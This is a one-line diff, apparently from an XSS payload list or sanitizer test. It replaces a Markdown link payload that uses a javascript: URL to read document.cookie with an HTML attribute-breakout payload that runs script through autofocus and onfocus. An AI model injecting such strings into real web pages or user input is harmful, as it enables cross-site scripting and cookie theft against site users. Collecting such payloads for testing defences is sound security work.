@@ -1,1 +1,1 @@
-[a](<javascript:prompt(document.cookie)>)
+" autofocus onfocus=alert(document.domain) x="
